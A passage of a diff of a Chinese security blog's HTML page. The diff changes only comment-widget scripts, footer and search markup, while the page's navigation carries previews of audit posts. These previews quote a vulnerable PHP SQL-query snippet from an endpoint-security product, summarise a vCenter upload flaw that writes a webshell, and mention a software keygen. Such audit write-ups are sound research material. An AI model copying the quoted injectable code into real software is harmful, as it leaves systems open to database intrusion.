</span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
-  if (typeof pangu === 'object') pangu.autoSpacingPage()
-  else {
-    getScript('https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js')
-      .then(() => {
-        pangu.autoSpacingPage()
-      })
-  }
-}
-
-function panguInit () {
-  if (false){
-    GLOBAL_CONFIG_SITE.isPost && panguFn()
-  } else {
-    panguFn()
-  }
-}
-
-document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>(() => {
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://0x20h.com">Sp4ce</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://0x20h.com/p/a062.html">https://0x20h.com/p/a062.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://0x20h.com" target="_blank">Sp4ce's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%97%A5%E5%B8%B8/">日常</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post-share"><div class="social-share" data-image="/./img/random/material-3.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/p/a698.html" title="浪潮ClusterEngine登录控制缺陷"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/random/material-12.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">浪潮ClusterEngine登录控制缺陷</div></div><div class="info-2"><div class="info-item-1">  ...</div></div></div></a><a class="pagination-related" href="/p/7cb6.html" title="CVE-2021-21972 复现和分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/random/material-11.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CVE-2021-21972 复现和分析</div></div><div class="info-2"><div class="info-item-1">0x01 背景vSphere是VMware推出的虚拟化平台套件，包含ESXi、vCenter Server等一系列的软件。其中vCenter Server为 ESXi的控制中心，可从单一控制点统一管理数据中心的所有vSphere主机和虚拟机，使得IT管理员能够提高控制能力，简化入场任务，并降低IT环境的管理复杂性与成本。 vSphere Client（HTML5）在vCenter Server插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放443端口的服务器向vCenter Server发送精心构造的请求，从而在服务器上写入webshell，最终造成远程任意代码执行。 0x02 代码分析vCenter Server的vROPS插件的API未经过鉴权，存在一些敏感接口。其中 uploadova 接口存在一个上传 OVA 文件的功能： @RequestMapping(   value = &#123;&quot;/uploadova&quot;&#125;,   method = &#123;RequestMethod.POST&#125;)public void...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/p/6fcd.html" title="金山终端安全系统V9安全问题"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/random/material-19.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-14</div><div class="info-item-2">金山终端安全系统V9安全问题</div></div><div class="info-2"><div class="info-item-1">SQL注入文件inter/update_software_info.php &lt;?php//客户端显示数据require_once &quot;./use_db.php&quot;;require_once &quot;./common/functions.php&quot;;$return=array();$return[&quot;nResult&quot;] =0;$where=&#x27;where 1=1&#x27;;if (!is_null($_POST[&#x27;type&#x27;]) and $_POST[&#x27;type&#x27;] !=&quot;&quot;) &#123;    $id=$_POST[&#x27;type&#x27;];    $where .=&quot; and type=$id &quot;;&#125;if (!is_null($_POST[&#x27;key&#x27;])) &#123;    $keyname=$_POST[&#x27;key&#x27;];    $where .=&quot; and...</div></div></div></a><a class="pagination-related" href="/p/9367.html" title="审计通达OA时的一些记录"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/random/material-12.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-23</div><div class="info-item-2">审计通达OA时的一些记录</div></div><div class="info-2"><div class="info-item-1">学习审计通达OA时发现的一些有意思的事   全局变量覆盖审计时发现前辈们提到了这个问题，跟了下存在问题的文件 比如存在变量覆盖的文件是pda\vote\list.php， require_once &quot;pda/auth.php&quot;;include_once &quot;inc/conn.php&quot;;include_once &quot;inc/utility_all.php&quot;;include_once &quot;mobile/api/qyapp.vote.class.php&quot;;if ($P == &quot;&quot;) &#123;	$P = $_COOKIE[&quot;PHPSESSID&quot;];&#125;else &#123;	$P = $_GET[&quot;P&quot;];&#125;  这里包含了inc/conn.php数据库连接文件  继续跟，发现包含了inc/td_config.php &lt;?phpinclude_once...</div></div></div></a><a class="pagination-related" href="/p/1129.html" title="zfaka注入分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/random/material-7.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-28</div><div class="info-item-2">zfaka注入分析</div></div><div class="info-2"><div class="info-item-1"> zfaka官方于7月11日发布了补丁，修复了一处sql注入，简单记录下分析过程 0x01补丁补丁显示修改了application/function/F_Network.php文件，该文件的getClientIP函数使用了网络上通用遍历XFF等header头获取真实IP的方法,但是获取完XFF后根据,截断获取第一个值后直接返回IP  0x02 分析全局搜索下调用该函数的位置，发现前台的application/modules/Product/controllers/Order.php文件和application/modules/Product/controllers/Query.php调用了该函数，对应功能为下单和订单查询功能  进一步确认后为application/modules/Product/controllers/Query.php第151行为存在漏洞的代码 0x03 动态调试对151行下断点进行调试  找到对应功能  成功断下，单步跟入  发现在application/library/Core/Model.php中的Where方法对orderid 、isdelete 、...</div></div></div></a><a class="pagination-related" href="/p/a73d.html" title="Apache Log Viewer 5.X 注册机"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/random/material-5.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-20</div><div class="info-item-2">Apache Log Viewer 5.X 注册机</div></div><div class="info-2"><div class="info-item-1">抽空研究了下ALV的注册机制，写了个注册机   分析ALV的注册方法是unlockCodeToolStripMenuItem_Click方法，当点击Unlock按钮时会触发注册事件并调用Class2类中的smethod_1、smethod_02个方法进行校验，详细流程见如下代码 unlockCodeToolStripMenuItem_Click方法 private void unlockCodeToolStripMenuItem_Click(object sender, EventArgs e)	&#123;		string text = this.prefs_0.Key;		if (!InputForm.smethod_3(&quot;Apache Logs Viewer | &quot; + Class96.smethod_264(), Class96.smethod_143(), ref text))		&#123;			return;		&#125;		if (text != null)		&#123;			text = text.Trim();		&#125;		if...</div></div></div></a><a class="pagination-related" href="/p/7cb6.html" title="CVE-2021-21972 复现和分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/random/material-11.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-27</div><div class="info-item-2">CVE-2021-21972 复现和分析</div></div><div class="info-2"><div class="info-item-1">0x01 背景vSphere是VMware推出的虚拟化平台套件，包含ESXi、vCenter Server等一系列的软件。其中vCenter Server为 ESXi的控制中心，可从单一控制点统一管理数据中心的所有vSphere主机和虚拟机，使得IT管理员能够提高控制能力，简化入场任务，并降低IT环境的管理复杂性与成本。 vSphere Client（HTML5）在vCenter Server插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放443端口的服务器向vCenter Server发送精心构造的请求，从而在服务器上写入webshell，最终造成远程任意代码执行。 0x02 代码分析vCenter Server的vROPS插件的API未经过鉴权，存在一些敏感接口。其中 uploadova 接口存在一个上传 OVA 文件的功能： @RequestMapping(   value = &#123;&quot;/uploadova&quot;&#125;,   method = &#123;RequestMethod.POST&#125;)public void...</div></div></div></a><a class="pagination-related" href="/p/2e3.html" title="记录一些CS上线手法"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./img/random/material-8.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-02</div><div class="info-item-2">记录一些CS上线手法</div></div><div class="info-2"><div class="info-item-1">  ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AC%AC%E4%B8%80%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">0x01 第一类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#API-URL"><span class="toc-number">1.1.</span> <span class="toc-text">API_URL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%A4%9A%E5%A4%84"><span class="toc-number">1.2.</span> <span class="toc-text">其他多处</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ext-report-www-source-dao-DataPortalSummaryDao-php%E4%B8%AD%E7%9A%84updateSummaryDetail%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">ext&#x2F;report&#x2F;www&#x2F;source&#x2F;dao&#x2F;DataPortalSummaryDao.php中的updateSummaryDetail方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updateSummaryForAssetRegister%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">updateSummaryForAssetRegister方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ext-asset-www-source-dao-SummaryDao-php%E4%B8%AD%E7%9A%84updateSummaryDetail%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.3.</span> <span class="toc-text">ext&#x2F;asset&#x2F;www&#x2F;source&#x2F;dao&#x2F;SummaryDao.php中的updateSummaryDetail方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updateSummaryForAssetRegister%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">updateSummaryForAssetRegister方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updateSummaryDetailByNacUser%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.5.</span> <span class="toc-text">updateSummaryDetailByNacUser方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">第二类</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2016 - 2024 By Sp4ce</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
   let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
 
-  const initWaline = (Fn) => {
-    const waline = Fn(Object.assign({
-      el: '#waline-wrap',
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
       serverURL: 'https://waline.0x20h.com/',
       pageview: false,
       dark: 'html[data-theme="dark"]',
-      path: window.location.pathname,
       comment: false,
-    }, null))
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
 
-    const destroyWaline = () => {
-      waline.destroy()
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
     }
-
-    btf.addGlobalFn('pjax', destroyWaline, 'destroyWaline')
   }
 
-  const loadWaline = async () => {
-    if (initFn) initWaline(initFn)
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
     else {
-      await getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline.min.css')
-      const { init } = await import('https://cdn.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline.min.js')
-      initFn = init || Waline.init
-      initWaline(initFn)
-      window.walineFn = initFn
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
     }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
   }
 
   if ('Waline' === 'Waline' || !true) {
@@ -270,8 +252,8 @@ document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-
   } else {
     window.loadOtherComment = loadWaline
   }
-})()</script></div><canvas id="universe"></canvas><script data-pjax src="/js/thirdparty/bubbles.js"></script><script data-pjax src="/js/thirdparty/universe.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+})()</script></div><canvas id="universe"></canvas><script data-pjax src="/js/thirdparty/bubbles.js"></script><script data-pjax src="/js/thirdparty/universe.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
 POWERMODE.shake = true;
 POWERMODE.mobile = false;
 document.body.addEventListener('input', POWERMODE);
-</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"display":{"position":"right","width":300,"height":600,"vOffset":-50},"mobile":{"show":false},"dialog":{"enable":false,"hitokoto":false},"react":{"opacity":0.7},"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"log":false});</script></body></html>
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="输入以搜索" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"display":{"position":"right","width":300,"height":600,"vOffset":-50},"mobile":{"show":false},"dialog":{"enable":false,"hitokoto":false},"react":{"opacity":0.7},"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"log":false});</script></body></html>
